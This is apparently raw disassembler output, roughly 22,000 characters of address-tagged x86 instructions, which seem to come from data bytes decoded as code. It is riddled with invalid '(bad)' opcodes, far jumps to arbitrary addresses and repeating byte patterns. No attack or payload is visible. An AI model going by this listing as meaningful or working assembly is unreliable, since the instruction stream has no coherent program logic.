  41df83:	jno    0x41df0d
  41df85:	add    DWORD PTR ds:[eax],eax
  41df88:	add    al,0x1
  41df8a:	add    BYTE PTR [eax],al
  41df8c:	mov    esp,gs
  41df8e:	or     ebp,ebx
  41df90:	rcl    DWORD PTR [edx+0x4f562a61],0x92
  41df97:	jecxz  0x41df20
  41df99:	dec    esi
  41df9a:	fs dec edx
  41df9c:	cld    
  41df9d:	imul   DWORD PTR [eax-0x66]
  41dfa0:	addr16 mov al,0xa9
  41dfa3:	sub    ecx,esi
  41dfa5:	pop    ebp
  41dfa6:	js     0x41dfed
  41dfa8:	mov    al,ds:0x4b32799c
  41dfad:	sub    BYTE PTR [eax-0x7],dh
  41dfb0:	push   esi
  41dfb1:	call   0x1b52f0b6
  41dfb6:	inc    ebx
  41dfb7:	jmp    0x96ea:0x6e054a9f
  41dfbe:	lea    ebp,[edx+0x6c]
  41dfc1:	push   esi
  41dfc2:	push   ecx
  41dfc3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dfc4:	jnp    0x41e03a
  41dfc6:	pop    es
  41dfc7:	fstp   QWORD PTR [edi-0x71d99fc8]
  41dfcd:	push   0xdbb725c2
  41dfd2:	mov    al,0xac
  41dfd4:	add    al,0xc6
  41dfd6:	push   ds
  41dfd7:	xchg   ebp,eax
  41dfd8:	push   eax
  41dfd9:	fcom   DWORD PTR [ecx+0x3329ed31]
  41dfdf:	adc    al,0x9d
  41dfe1:	mov    cl,0x2e
  41dfe3:	jle    0x41dfc2
  41dfe5:	inc    eax
  41dfe6:	xchg   ebx,eax
  41dfe7:	sub    cl,dl
  41dfe9:	stos   DWORD PTR es:[edi],eax
  41dfea:	adc    DWORD PTR [edx+eax*2-0x390acb36],esp
  41dff1:	scas   eax,DWORD PTR es:[edi]
  41dff2:	fisttp DWORD PTR [ebp-0x524da0e9]
  41dff8:	mov    esp,0x57d0904d
  41dffd:	xlat   BYTE PTR ds:[ebx]
  41dffe:	dec    ecx
  41dfff:	pop    ecx
  41e000:	mov    esi,0x4a906be2
  41e005:	inc    esi
  41e006:	(bad)  
  41e007:	xchg   esi,eax
  41e008:	adc    al,0x8e
  41e00a:	pop    edx
  41e00b:	sub    al,0x88
  41e00d:	arpl   WORD PTR [ebx+0x78],dx
  41e010:	enter  0x4633,0xf0
  41e014:	push   ss
  41e015:	add    eax,0xff1791f
  41e01a:	xchg   ebx,edi
  41e01c:	add    al,0xda
  41e01e:	fs or  al,0x16
  41e021:	clc    
  41e022:	push   eax
  41e023:	aas    
  41e024:	inc    esi
  41e025:	das    
  41e026:	dec    ax
  41e028:	jecxz  0x41dfe8
  41e02a:	adc    al,BYTE PTR [eax]
  41e02c:	xchg   ebp,eax
  41e02d:	xchg   edx,eax
  41e02e:	xchg   esi,eax
  41e02f:	in     eax,dx
  41e030:	jl     0x41dfca
  41e032:	jb     0x41e096
  41e034:	pop    edi
  41e035:	cwde   
  41e036:	cwde   
  41e037:	call   0x1ec4:0x9363875d
  41e03e:	lsl    ecx,WORD PTR [ebx+0x13]
  41e042:	push   ds
  41e043:	jns    0x41e02f
  41e045:	pop    eax
  41e046:	fwait
  41e047:	lahf   
  41e048:	mov    ah,0xaa
  41e04a:	jmp    0x519802b0
  41e04f:	lahf   
  41e050:	scas   al,BYTE PTR es:[edi]
  41e051:	add    DWORD PTR [ebx+0x38],esi
  41e054:	sub    ah,dl
  41e056:	jg     0x41e0a4
  41e058:	call   0xffb7d573
  41e05d:	lahf   
  41e05e:	dec    esi
  41e05f:	mov    ah,0xbf
  41e061:	call   0xb325:0xd2f0c045
  41e068:	repnz lea eax,[eax-0x78ad1efc]
  41e06f:	mov    ah,0xd0
  41e071:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e072:	xor    DWORD PTR [edi+0x1c],0x27c8a35d
  41e079:	add    dl,BYTE PTR cs:[ecx+0x57]
  41e07d:	test   al,0xa1
  41e07f:	xlat   BYTE PTR ds:[ebx]
  41e080:	ins    DWORD PTR es:[edi],dx
  41e081:	ins    DWORD PTR es:[edi],dx
  41e082:	bnd jb 0x41e0d5
  41e085:	bound  edi,QWORD PTR [ebx]
  41e087:	fistp  DWORD PTR [esi+0x9]
  41e08a:	fcomp  DWORD PTR [ecx+esi*1+0xd69c91]
	...
  41e0f1:	add    BYTE PTR [eax],al
  41e0f3:	add    BYTE PTR [edi+0x53],cl
  41e0f6:	add    al,0xc
  41e0f8:	sbb    al,0x5f
  41e0fa:	dec    edi
  41e0fb:	push   ebx
  41e0fc:	out    0x6d,eax
  41e0fe:	aad    0x48
  41e100:	mov    esi,0x8c8b7de8
  41e105:	aas    
  41e106:	add    DWORD PTR [eax],eax
  41e108:	add    al,0x1
  41e10a:	add    BYTE PTR [eax],al
  41e10c:	loop   0x41e0b6
  41e10e:	retf   0x3925
  41e111:	mov    dl,0x78
  41e113:	or     eax,0x64e0b89e
  41e118:	pop    edx
  41e119:	pushf  
  41e11a:	mov    DWORD PTR [esi],edi
  41e11c:	loope  0x41e155
  41e11e:	fwait
  41e11f:	ins    DWORD PTR es:[edi],dx
  41e120:	cmp    DWORD PTR fs:[esi+0x1b],eax
  41e124:	mov    esp,0xfcb33e47
  41e129:	cld    
  41e12a:	shl    DWORD PTR [esi+esi*8-0x73],0x9a
  41e12f:	lods   eax,DWORD PTR gs:[esi]
  41e131:	retf   0xe27f
  41e134:	clc    
  41e135:	xor    al,0xb8
  41e137:	ja     0x41e0e4
  41e139:	add    DWORD PTR [esi],esi
  41e13b:	inc    eax
  41e13c:	push   edx
  41e13d:	pop    eax
  41e13e:	sub    bl,dh
  41e140:	sub    al,0xc4
  41e142:	push   es
  41e143:	pusha  
  41e144:	mov    bl,al
  41e146:	out    0x9d,eax
  41e148:	adc    al,0x19
  41e14a:	cmp    dh,BYTE PTR [eax+0x434df56a]
  41e150:	dec    esp
  41e151:	(bad)  
  41e152:	scas   al,BYTE PTR es:[edi]
  41e153:	push   ebp
  41e154:	les    ecx,FWORD PTR [eax-0x77]
  41e157:	pusha  
  41e158:	inc    ebx
  41e159:	push   ebp
  41e15a:	mov    edx,0xb8c149b5
  41e15f:	lods   al,BYTE PTR ds:[esi]
  41e160:	push   esi
  41e161:	lods   eax,DWORD PTR ds:[esi]
  41e162:	out    0xee,eax
  41e164:	mov    dl,0x4c
  41e166:	in     al,0x1b
  41e168:	inc    edi
  41e169:	push   ebx
  41e16a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e16b:	mov    ebp,ecx
  41e16d:	fwait
  41e16e:	adc    ecx,edx
  41e170:	cmp    DWORD PTR [edi-0x6c1f8cd9],0x8343d75b
  41e17a:	mov    ds:0x82048111,eax
  41e17f:	shl    edi,1
  41e181:	push   ds
  41e182:	inc    ebp
  41e183:	add    ch,ch
  41e185:	mov    esp,0x5c1a3f73
  41e18a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e18b:	or     bh,dl
  41e18d:	push   es
  41e18e:	popf   
  41e18f:	out    dx,al
  41e190:	cmp    edx,edx
  41e192:	ss mov cl,0x35
  41e195:	sbb    al,BYTE PTR [ebp+ebx*4+0x56]
  41e199:	je     0x41e12b
  41e19b:	cmp    DWORD PTR [ecx-0x3e],0x2b3cc2e
  41e1a2:	scas   eax,DWORD PTR es:[edi]
  41e1a3:	jmp    0x49b2:0x951c459a
  41e1aa:	stos   DWORD PTR es:[edi],eax
  41e1ab:	adc    bh,bl
  41e1ad:	fsubrp st(5),st
  41e1af:	rol    DWORD PTR [esi],cl
  41e1b1:	std    
  41e1b2:	add    ebp,DWORD PTR [esi]
  41e1b4:	mov    al,BYTE PTR [edx+0x6a]
  41e1b7:	je     0x41e193
  41e1b9:	ret    
  41e1ba:	loop   0x41e220
  41e1bc:	faddp  st(0),st
  41e1be:	cmp    al,0x15
  41e1c0:	nop
  41e1c1:	cmp    DWORD PTR [edi+0x78561565],edi
  41e1c7:	sbb    DWORD PTR [eax],ebp
  41e1c9:	dec    eax
  41e1ca:	mov    dl,0x8d
  41e1cc:	inc    eax
  41e1cd:	push   0xf534f709
  41e1d2:	pop    edi
  41e1d3:	int    0xf2
  41e1d5:	adc    eax,0x9c43d6ae
  41e1da:	pusha  
  41e1db:	jmp    0xcdc4:0xf1f648ee
  41e1e2:	ins    BYTE PTR es:[edi],dx
  41e1e3:	retf   
  41e1e4:	pushf  
  41e1e5:	jo     0x41e1e1
  41e1e7:	scas   eax,DWORD PTR es:[edi]
  41e1e8:	ja     0x41e1a3
  41e1ea:	push   es
  41e1eb:	push   ss
  41e1ec:	add    eax,0xa09b37ac
  41e1f1:	xor    esi,DWORD PTR [ecx]
  41e1f3:	mov    ebx,0xd92795ec
  41e1f8:	sub    eax,0x5e8eb8d7
  41e1fd:	scas   al,BYTE PTR es:[edi]
  41e1fe:	and    BYTE PTR [ecx],0xa8
  41e201:	inc    ebp
  41e202:	in     eax,0x6a
  41e204:	les    esp,FWORD PTR [edi+ebx*1]
  41e207:	(bad)  
  41e208:	in     eax,0xff
  41e20a:	push   es
  41e20b:	cmp    esi,ebx
  41e20d:	mov    BYTE PTR [ebx-0x22],dl
	...
  41e274:	stos   DWORD PTR es:[edi],eax
  41e275:	add    dh,BYTE PTR [edi-0x1a]
  41e278:	push   edi
  41e27a:	mov    ebx,0x6f64c34f
  41e27f:	or     al,0x74
  41e281:	icebp  
  41e282:	add    al,0x4d
  41e284:	nop
  41e285:	inc    eax
  41e286:	add    DWORD PTR [eax],eax
  41e288:	add    al,0x1
  41e28a:	add    BYTE PTR [eax],al
  41e28c:	iret   
  41e28d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e28e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e28f:	test   eax,0xe1e60852
  41e294:	xchg   DWORD PTR [edi+0x6],ecx
  41e297:	mov    dl,BYTE PTR [ebx-0x4b]
  41e29a:	jmp    0x4e59:0x1525462c
  41e2a1:	fwait
  41e2a2:	jmp    0xbdc1701d
  41e2a7:	pop    ebx
  41e2a8:	sti    
  41e2a9:	aam    0x9e
  41e2ab:	arpl   WORD PTR [ebp+0x1c],bx
  41e2ae:	mov    DWORD PTR [edx+0x5e],ecx
  41e2b1:	push   0x35
  41e2b3:	shr    DWORD PTR [edi-0x73ecc7d8],1
  41e2b9:	jmp    0x77a73cde
  41e2be:	mov    dl,0x84
  41e2c0:	adc    BYTE PTR [ebp-0x66],0x65
  41e2c4:	daa    
  41e2c5:	(bad)  
  41e2c6:	test   BYTE PTR [edi],0xb4
  41e2c9:	fisubr WORD PTR [ecx+0x46]
  41e2cc:	das    
  41e2cd:	ins    DWORD PTR es:[edi],dx
  41e2ce:	shl    DWORD PTR [ebx-0x3350029a],0xf2
  41e2d5:	jo     0x41e33a
  41e2d7:	adc    al,0xdc
  41e2d9:	xchg   ebx,eax
  41e2da:	or     ebp,DWORD PTR [edi]
  41e2dc:	daa    
  41e2dd:	push   DWORD PTR [edi-0x6b]
  41e2e0:	xchg   esp,eax
  41e2e1:	or     cl,BYTE PTR [ebx]
  41e2e3:	ins    DWORD PTR es:[edi],dx
  41e2e4:	mov    bl,0x2a
  41e2e6:	div    BYTE PTR ds:0x30689a83
  41e2ec:	pop    es
  41e2ed:	psrlq  mm6,QWORD PTR [esi+0x23]
  41e2f1:	aad    0xf9
  41e2f3:	jg     0x41e2c4
  41e2f5:	or     DWORD PTR [ebp*2-0x47e02496],0x1a0b5057
  41e300:	push   0xffffff8f
  41e302:	inc    eax
  41e303:	fcomip st,st(0)
  41e305:	cld    
  41e306:	or     al,0x9b
  41e308:	iret   
  41e309:	push   edi
  41e30a:	sbb    ebx,esi
  41e30c:	jp     0x41e2a3
  41e30e:	sbb    DWORD PTR [edi-0x76],ecx
  41e311:	lock adc edx,eax
  41e314:	adc    dl,BYTE PTR [edx+0x52]
  41e317:	mov    esi,0x8fc03cde
  41e31c:	lea    eax,[edi+eax*2-0x3c390c9f]
  41e323:	test   BYTE PTR [esp+ecx*8],dl
  41e326:	mov    dl,0x7
  41e328:	sub    edi,DWORD PTR [esi]
  41e32a:	mov    dl,0x91
  41e32c:	ret    0x7987
  41e32f:	pop    edi
  41e330:	add    al,0x32
  41e332:	add    al,0x62
  41e334:	mov    bl,0x7e
  41e337:	inc    DWORD PTR [eax]
  41e339:	push   edx
  41e33a:	lods   al,BYTE PTR ds:[esi]
  41e33b:	jp     0x41e302
  41e33d:	sbb    BYTE PTR [eax+0x72b5a8dd],bl
  41e343:	(bad)  
  41e344:	jg     0x41e320
  41e346:	arpl   WORD PTR [edi-0x29ec4b8e],bx
  41e34c:	pusha  
  41e34d:	call   DWORD PTR [esi+0x65aa6fd7]
  41e353:	sub    al,0x74
  41e355:	pop    esi
  41e356:	xor    DWORD PTR [edi-0x20],esi
  41e359:	popf   
  41e35a:	imul   ecx,DWORD PTR [edi+0x11],0x40c408e8
  41e361:	sub    ah,dl
  41e363:	or     edi,DWORD PTR [esi+0x48b94f45]
  41e369:	(bad)  
  41e36b:	mov    edx,0xd4cd0043
  41e370:	ret    0xf98a
  41e373:	sbb    dl,al
  41e375:	mov    al,ds:0x2774c6e
  41e37a:	add    eax,0x560a211
  41e37f:	and    DWORD PTR [ecx-0xf],0x41342f78
  41e386:	retf   0x7cbc
  41e389:	inc    ebp
  41e38a:	cli    
  41e38b:	rcl    BYTE PTR [eax+0xdda2ea],0x0
	...
  41e3f2:	add    BYTE PTR [eax],al
  41e3f4:	mov    DWORD PTR [edx],edx
  41e3f6:	ja     0x41e417
  41e3f8:	(bad)  
  41e3f9:	jg     0x41e3e4
  41e3fb:	xchg   esi,eax
  41e3fc:	or     DWORD PTR [edx+0x18],0x5c016b09
  41e403:	clc    
  41e404:	xchg   esp,eax
  41e405:	inc    ecx
  41e406:	add    DWORD PTR [eax],eax
  41e408:	add    al,0x1
  41e40a:	add    BYTE PTR [eax],al
  41e40c:	popa   
  41e40d:	mov    es,WORD PTR [ecx+ebx*1+0x6f]
  41e411:	mov    ecx,DWORD PTR [eax]
  41e413:	inc    eax
  41e414:	ins    DWORD PTR es:[edi],dx
  41e415:	mov    ch,0xdb
  41e417:	inc    ecx
  41e418:	cwde   
  41e419:	push   ecx
  41e41a:	xor    eax,0xf8a87be5
  41e41f:	inc    ebx
  41e420:	mov    dh,0x6e
  41e422:	adc    al,BYTE PTR [ebx+0x52]
  41e425:	aas    
  41e426:	push   ecx
  41e427:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e428:	and    edx,edx
  41e42a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e42b:	jg     0x41e49d
  41e42d:	sub    BYTE PTR [bp+si],ch
  41e430:	in     eax,0x2
  41e432:	push   eax
  41e433:	pushf  
  41e434:	pusha  
  41e435:	sub    al,0xe2
  41e437:	sub    BYTE PTR [edx],0x32
  41e43a:	cli    
  41e43b:	jp     0x41e482
  41e43d:	or     al,0x78
  41e43f:	mov    eax,ds:0x7908f1e4
  41e444:	popa   
  41e445:	and    DWORD PTR ds:[ebx-0x3a],esi
  41e449:	sbb    al,0x2a
  41e44b:	xor    dh,BYTE PTR [eax]
  41e44d:	in     al,dx
  41e44e:	cli    
  41e44f:	mov    ds:0x44cacbc4,eax
  41e454:	xchg   edx,eax
  41e455:	dec    esi
  41e456:	hlt    
  41e457:	jnp    0x41e4bc
  41e459:	xor    ebx,0xf55cba12
  41e45f:	or     ecx,DWORD PTR [ecx]
  41e461:	ins    DWORD PTR es:[edi],dx
  41e462:	test   eax,0xa28c4c91
  41e467:	adc    DWORD PTR [edi],ecx
  41e469:	xchg   edx,ecx
  41e46b:	sub    BYTE PTR [eax],al
  41e46d:	inc    edi
  41e46e:	fild   WORD PTR [ebp-0x7]
  41e471:	leave  
  41e472:	ss pop esp
  41e474:	dec    esi
  41e475:	shl    DWORD PTR [ecx+esi*4+0x38],1
  41e479:	popa   
  41e47a:	jae    0x41e48e
  41e47c:	xlat   BYTE PTR ds:[ebx]
  41e47d:	sbb    cl,dl
  41e47f:	lods   al,BYTE PTR ds:[esi]
  41e480:	(bad)  
  41e481:	fcmovbe st,st(1)
  41e483:	lds    edi,FWORD PTR ds:0x74426495
  41e489:	cli    
  41e48a:	iret   
  41e48b:	hlt    
  41e48c:	xchg   BYTE PTR [ebx+esi*2-0x9],ch
  41e490:	xor    eax,0x711247d1
  41e495:	push   0x3b3bec78
  41e49a:	gs in  al,0x20
  41e49d:	lahf   
  41e49e:	cmp    DWORD PTR [ebp+0x63],edi
  41e4a1:	ja     0x41e4db
  41e4a3:	add    eax,DWORD PTR [ebx-0x60]
  41e4a6:	mov    edi,0xed08a4d3
  41e4ab:	dec    ebp
  41e4ac:	inc    eax
  41e4ad:	fisub  WORD PTR [ebx-0x61a138e9]
  41e4b3:	call   0x6110:0xe6824d0c
  41e4ba:	mov    ebp,0x746a4ba4
  41e4bf:	cmp    eax,0x6cef412a
  41e4c4:	iret   
  41e4c5:	adc    eax,0x52e8d642
  41e4ca:	call   0x7fc465b9
  41e4cf:	push   ss
  41e4d0:	inc    esp
  41e4d1:	dec    esi
  41e4d2:	jnp    0x41e472
  41e4d4:	out    dx,al
  41e4d5:	idiv   DWORD PTR [eax-0x32a07fc8]
  41e4db:	into   
  41e4dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e4dd:	f2xm1  
  41e4df:	jnp    0x41e502
  41e4e1:	out    0x91,eax
  41e4e3:	cs pop es
  41e4e5:	int    0x26
  41e4e7:	xor    al,0x3f
  41e4e9:	ja     0x41e4e3
  41e4eb:	jae    0x41e484
  41e4ed:	aam    0xf4
  41e4ef:	in     eax,0x33
  41e4f1:	mov    al,ds:0xbc99c48
  41e4f6:	cmp    DWORD PTR [edx+0x5ffda8fc],esp
  41e4fc:	idiv   edx
  41e4fe:	adc    ecx,ebx
  41e500:	push   es
  41e501:	sbb    ch,BYTE PTR [esi]
  41e503:	test   cl,dh
  41e505:	int    0x86
  41e507:	fcmovb st,st(6)
  41e509:	nop
  41e50a:	xchg   esp,eax
  41e50b:	test   DWORD PTR [eax+0xab6add],ecx
	...
  41e571:	add    BYTE PTR [eax],al
  41e573:	add    BYTE PTR [eax],ah
  41e575:	push   0xffffffcb
  41e577:	dec    ebx
  41e578:	retf   
  41e579:	jmp    0x41e51b
  41e57b:	imul   ebp,ebx,0xffffffb1
  41e57e:	aaa    
  41e57f:	je     0x41e53d
  41e581:	retf   
  41e582:	pusha  
  41e583:	dec    ecx
  41e584:	cwde   
  41e585:	inc    edx
  41e586:	add    DWORD PTR [eax],eax
  41e588:	add    al,0x1
  41e58a:	add    BYTE PTR [eax],al
  41e58c:	out    0x6d,eax
  41e58e:	repnz fldenv [ebx+0x1d5e818]
  41e595:	inc    eax
  41e596:	mov    ah,0xdb
  41e598:	mov    al,0x87
  41e59a:	cwde   
  41e59b:	or     ecx,DWORD PTR [edx-0x141aae44]
  41e5a1:	repz or al,0x47
  41e5a4:	or     al,0x97
  41e5a6:	and    al,0xd7
  41e5a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e5a9:	sbb    eax,0x3682f1d8
  41e5ae:	mov    eax,0x6b64a604
  41e5b3:	cmp    eax,0xc3a5bac4
  41e5b8:	aam    0xc5
  41e5ba:	loopne 0x41e61c
  41e5bc:	fwait
  41e5bd:	sub    edx,DWORD PTR [eax+0x70]
  41e5c0:	cdq    
  41e5c1:	mov    BYTE PTR [edx],dh
  41e5c3:	jge    0x41e5ba
  41e5c5:	es inc esp
  41e5c7:	pop    ds
  41e5c8:	lea    ebp,[ebp+0x2e]
  41e5cb:	mov    ebx,0x9c8b20a2
  41e5d0:	imul   bl
  41e5d2:	icebp  
  41e5d3:	mov    ecx,0xb063b17d
  41e5d8:	idiv   BYTE PTR [ecx+ecx*8-0x1148a983]
  41e5df:	sbb    al,0x4a
  41e5e1:	leave  
  41e5e2:	cmp    ebx,esp
  41e5e4:	stos   BYTE PTR es:[edi],al
  41e5e5:	leave  
  41e5e6:	push   0x6f
  41e5e8:	inc    ecx
  41e5e9:	mov    esi,0xdbf9e2f0
  41e5ee:	mov    eax,0x401a186c
  41e5f3:	xor    DWORD PTR [esi+ecx*1],esi
  41e5f6:	mov    ebx,0x91635cf0
  41e5fb:	adc    al,0x95
  41e5fd:	adc    BYTE PTR [esi+edx*4-0x22],cl
  41e601:	std    
  41e602:	dec    ebp
  41e603:	cmp    BYTE PTR [ebx+0x16],0x7c
  41e607:	out    dx,al
  41e608:	mov    esi,DWORD PTR [edi+0x45fb1ab9]
  41e60e:	ss and bh,cl
  41e611:	mov    cl,dl
  41e613:	dec    esi
  41e614:	mov    eax,0xb05a3668
  41e619:	enter  0x1497,0xfe
  41e61d:	ror    DWORD PTR [esi+0x4f],0xba
  41e621:	adc    DWORD PTR [edi],eax
  41e623:	pop    ss
  41e624:	xchg   ecx,eax
  41e625:	mov    al,0xd8
  41e627:	xchg   BYTE PTR [ebx-0x3a89ba44],bh
  41e62d:	fmul   QWORD PTR [eax]
  41e62f:	jl     0x41e5c0
  41e631:	cwde   
  41e632:	aas    
  41e633:	mov    cl,0xce
  41e635:	inc    ebx
  41e636:	lods   al,BYTE PTR ds:[esi]
  41e637:	xor    BYTE PTR [ebx+0x29902661],dl
  41e63d:	xchg   esp,eax
  41e63e:	mov    dh,0xa2
  41e640:	jno    0x41e69a
  41e642:	or     bl,BYTE PTR [edi]
  41e644:	dec    edi
  41e645:	aam    0x7f
  41e647:	dec    esi
  41e648:	xchg   edx,eax
  41e649:	or     DWORD PTR [esi-0x4492c778],eax
  41e64f:	sbb    BYTE PTR [ecx+0x5a],al
  41e652:	enter  0xb8b6,0x38
  41e656:	lock lea esi,[eax-0xaf8833b]
  41e65d:	inc    ecx
  41e65e:	mov    edx,0x63153762
  41e663:	xor    esp,DWORD PTR [esi-0x474ff000]
  41e669:	lahf   
  41e66a:	stos   BYTE PTR es:[di],al
  41e66c:	les    edi,FWORD PTR [esi]
  41e66e:	pop    ds
  41e66f:	idiv   ebx
  41e671:	push   esp
  41e672:	inc    ebp
  41e673:	aad    0xfe
  41e675:	into   
  41e676:	mov    ds:0x94bbe809,eax
  41e67b:	jae    0x41e690
  41e67d:	out    0x72,eax
  41e67f:	lods   al,BYTE PTR ds:[esi]
  41e680:	or     edi,0xffffffce
  41e683:	lock fsub DWORD PTR [ebx+0x42]
  41e687:	into   
  41e688:	leave  
  41e689:	repz cmovne ebp,DWORD PTR [esp+ebp*1]
  41e68e:	pop    ds
  41e68f:	add    BYTE PTR ds:[eax],al
	...
  41e6f2:	add    BYTE PTR [eax],al
  41e6f4:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41e6fa:	cmc    
  41e6fb:	cwde   
  41e6fc:	xchg   esp,eax
  41e6fd:	push   0x37
  41e6ff:	sub    ecx,DWORD PTR [edx+0x7]
  41e702:	add    al,0xc6
  41e704:	pushf  
  41e705:	inc    ebx
  41e706:	add    DWORD PTR [eax],eax
  41e708:	add    al,0x1
  41e70a:	add    BYTE PTR [eax],al
  41e70c:	cli    
  41e70d:	pushw  0x9506
  41e711:	fdiv   QWORD PTR [esi+0x1befec59]
  41e717:	sbb    edi,edx
  41e719:	aad    0x70
  41e71b:	inc    ebx
  41e71c:	xchg   ecx,eax
  41e71d:	xchg   edx,eax
  41e71e:	xor    eax,0xd6bec0a5
  41e723:	out    0xf8,eax
  41e725:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e726:	jmp    0xa5bb0800
  41e72b:	push   edi
  41e72c:	stos   BYTE PTR es:[edi],al
  41e72d:	repnz mov edi,0xae28807d
  41e734:	push   es
  41e735:	and    eax,0x2ae466ea
  41e73a:	xor    DWORD PTR [edi+0x5],esi
  41e73d:	int    0xb6
  41e73f:	jle    0x41e7a3
  41e741:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e742:	fld    DWORD PTR [ebx+0x314b2ce]
  41e748:	inc    edi
  41e749:	int3   
  41e74a:	in     eax,0x4a
  41e74c:	mov    al,ds:0x59634688
  41e751:	mov    esp,0x15ed62c7
  41e756:	jae    0x41e744
  41e758:	sbb    DWORD PTR [ecx],esi
  41e75a:	or     DWORD PTR [edx+0x49],edx
  41e75d:	int    0x64
  41e75f:	mov    al,0x53
  41e761:	add    edx,DWORD PTR [edi+esi*1]
  41e764:	(bad)  
  41e765:	and    al,0xe2
  41e767:	push   es
  41e768:	inc    ebp
  41e769:	lods   al,BYTE PTR ds:[esi]
  41e76a:	daa    
  41e76b:	and    edi,edi
  41e76d:	and    BYTE PTR [ebx],dh
  41e76f:	mov    DWORD PTR [eax-0x6],esp
  41e772:	out    0x33,al
  41e774:	dec    esp
  41e775:	inc    eax
  41e776:	mov    BYTE PTR [ebp-0x20968cb5],al
  41e77c:	push   eax
  41e77d:	retf   0x5c7d
  41e780:	fld    QWORD PTR [edi]
  41e782:	pop    esp
  41e783:	scas   al,BYTE PTR es:[edi]
  41e784:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e785:	stos   BYTE PTR es:[edi],al
  41e786:	add    dl,0xd9
  41e789:	sbb    ecx,DWORD PTR [ebp-0x9]
  41e78c:	sti    
  41e78d:	sti    
  41e78e:	icebp  
  41e78f:	pop    ds
  41e790:	mov    ch,0xca
  41e792:	scas   eax,DWORD PTR es:[edi]
  41e793:	dec    esi
  41e794:	push   0xb235dd9d
  41e799:	int    0xed
  41e79b:	out    dx,eax
  41e79c:	test   DWORD PTR [edx],ecx
  41e79e:	xchg   esi,eax
  41e79f:	dec    ebp
  41e7a0:	scas   al,BYTE PTR es:[edi]
  41e7a1:	es scas eax,DWORD PTR es:[edi]
  41e7a3:	push   esp
  41e7a4:	popf   
  41e7a5:	(bad)  
  41e7a6:	fldcw  WORD PTR [ebp+0x16]
  41e7a9:	ja     0x41e7ca
  41e7ab:	out    0x85,al
  41e7ad:	push   ss
  41e7ae:	btr    DWORD PTR [ebx+0x30],eax
  41e7b2:	pop    edx
  41e7b3:	(bad)  [edi-0x25]
  41e7b6:	shr    BYTE PTR [eax+0x2c],0xe2
  41e7ba:	sbb    DWORD PTR [ebx-0x2f49cbe9],0xd8897194
  41e7c4:	sub    dh,dl
  41e7c6:	(bad)  
  41e7c7:	lock or bh,ch
  41e7ca:	mov    al,ds:0x79fbde23
  41e7cf:	nop
  41e7d0:	dec    edx
  41e7d1:	or     eax,DWORD PTR [ebp+0xf7bee8a]
  41e7d7:	sbb    bh,BYTE PTR [ebx+0x17f64aa7]
  41e7dd:	pop    ebp
  41e7de:	ret    0x4b4
  41e7e1:	inc    ecx
  41e7e2:	sbb    BYTE PTR [ecx-0x5a0c949],ah
  41e7e8:	xchg   edx,eax
  41e7e9:	in     al,dx
  41e7ea:	adc    DWORD PTR [eax+0x3a],ebp
  41e7ed:	cmp    bh,BYTE PTR [ecx]
  41e7ef:	gs popf 
  41e7f1:	int    0x5c
  41e7f3:	jnp    0x41e817
  41e7f5:	mov    dh,0xce
  41e7f7:	cmp    edx,DWORD PTR [ebx]
  41e7f9:	xor    al,BYTE PTR [eax+0x42]
  41e7fc:	adc    al,0x15
  41e7fe:	pop    ds
  41e7ff:	pop    ecx
  41e800:	cmp    DWORD PTR [esi-0x34],ebp
  41e803:	sub    DWORD PTR [ebp-0x2f634cae],esi
  41e809:	addr16 out 0xc3,al
  41e80c:	pop    esi
  41e80d:	xchg   ecx,eax
  41e80e:	dec    ebp
  41e80f:	leave  
	...
  41e874:	sub    eax,0x9e5c8a39
  41e879:	(bad)  
  41e87a:	(bad)  
  41e87b:	jns    0x41e8ec
  41e87d:	xor    al,0xcc
  41e87f:	jg     0x41e8a1
  41e881:	sar    BYTE PTR [ebx],cl
  41e883:	imul   esp,DWORD PTR [eax+0x4000144],0x1
  41e88a:	add    BYTE PTR [eax],al
  41e88c:	out    0x93,al
  41e88e:	and    BYTE PTR [ecx+ebx*4+0x5f],0x90
  41e893:	aas    
  41e894:	push   ecx
  41e895:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e896:	ficomp WORD PTR [edi-0x62]
  41e899:	test   BYTE PTR [eax],ah
  41e89b:	sub    ch,0xd0
  41e89e:	mov    bl,0x6f
  41e8a0:	std    
  41e8a1:	ins    BYTE PTR es:[edi],dx
  41e8a2:	nop
  41e8a3:	ins    DWORD PTR es:[edi],dx
  41e8a4:	cmp    eax,0x123e4617
  41e8a9:	stc    
  41e8aa:	daa    
  41e8ab:	sub    al,bl
  41e8ad:	mov    ds:0xc5bb7ce3,al
  41e8b2:	mov    ah,0x54
  41e8b4:	adc    ebx,DWORD PTR [edi+eiz*2]
  41e8b7:	inc    ecx
  41e8b8:	test   ah,bl
  41e8ba:	inc    edx
  41e8bb:	xchg   ebx,eax
  41e8bc:	ja     0x41e8da
  41e8be:	lods   al,BYTE PTR ds:[esi]
  41e8bf:	clc    
  41e8c0:	xchg   ecx,eax
  41e8c1:	pop    edi
  41e8c2:	int    0x23
  41e8c4:	pop    esp
  41e8c5:	fadd   DWORD PTR ds:0x15291061
  41e8cb:	push   ebp
  41e8cc:	test   eax,ecx
  41e8ce:	mov    al,ds:0x53de9515
  41e8d3:	xor    BYTE PTR [esp+esi*4+0x6e],0xa0
  41e8d8:	in     al,0xfe
  41e8da:	loop   0x41e93e
  41e8dc:	lods   al,BYTE PTR es:[esi]
  41e8de:	(bad)  
  41e8df:	jecxz  0x41e870
  41e8e1:	stos   BYTE PTR es:[edi],al
  41e8e2:	lods   al,BYTE PTR ds:[esi]
  41e8e3:	dec    ecx
  41e8e4:	pop    edx
  41e8e5:	ficom  DWORD PTR [eax+0x7a]
  41e8e8:	xor    al,dl
  41e8ea:	jbe    0x41e8d6
